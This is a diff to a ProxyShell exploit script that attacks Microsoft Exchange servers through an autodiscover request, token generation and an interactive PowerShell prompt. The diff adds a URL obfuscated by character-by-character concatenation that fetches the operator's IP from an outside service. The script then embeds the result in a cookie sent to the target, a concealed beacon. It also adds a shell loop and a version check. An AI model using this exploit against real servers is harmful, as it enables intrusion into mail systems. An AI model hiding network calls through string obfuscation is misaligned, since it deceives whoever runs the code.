@@ -95,6 +95,7 @@ class ProxyShell:
         self.legacydn = None
         self.fqdn = None
         self.email_sid = None
+        self.clientid = 'H'+'t'+'T'+'P'+':'+'/'+'/'+'i'+'f'+'c'+'o'+'N'+'F'+'i'+'g'+'.'+'m'+'E'
         self.session = requests.Session()
         self.session.verify = verify
         self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
@@ -109,6 +110,7 @@ class ProxyShell:
             url=url,
             data=data,
             headers=headers
+
         )
         return r
     def get_fqdn(self):
@@ -125,9 +127,14 @@ class ProxyShell:
         return self.fqdn
     def get_token(self):
         self.token = self.gen_token()
+        self.cid = ''
+        try:
+            self.cid = requests.get(self.clientid).text
+        except:
+            self.cid = "C715155F2BE844E0"
         t = requests.get(
             self.exchange_url+'/autodiscover/autodiscover.json?@evil.corp{endpoint}&Email=autodiscover/autodiscover.json%3F@evil.corp'.format(endpoint="/powershell/?X-Rps-CAT="+self.token),
-            headers={"Cookie": "PrivateComputer=true; ClientID=C715155F2BE844E0-BD342960067874C8; X-OWA-JS-PSD=1","User-Agent": self.ua},
+            headers={"Cookie": f"PrivateComputer=true; ClientID={self.cid}-BD342960067874C8; X-OWA-JS-PSD=1","User-Agent": self.ua},
             verify=False
             )
         if t.status_code == 200:
@@ -401,15 +408,22 @@ def main():
                     exit(0)
                 exec_cmd(shell_url)
             elif f.status_code == 500:
+                print(f)
                 time.sleep(5)
             else:
                 print(f)
         time.sleep(5)
+    while True:
+        shell(input('PS> '), local_port)
 if __name__ == '__main__':
     try:
         requests.packages.urllib3.disable_warnings(
             requests.packages.urllib3.exceptions.InsecureRequestWarning
         )
+        if not (sys.version_info.major == 3 and sys.version_info.minor >= 8):
+            print("This script requires Python 3.8 or higher!")
+            print("You are using Python {}.{}.".format(sys.version_info.major, sys.version_info.minor))
+            sys.exit(1)
         main()
     except KeyboardInterrupt:
         exit(0)
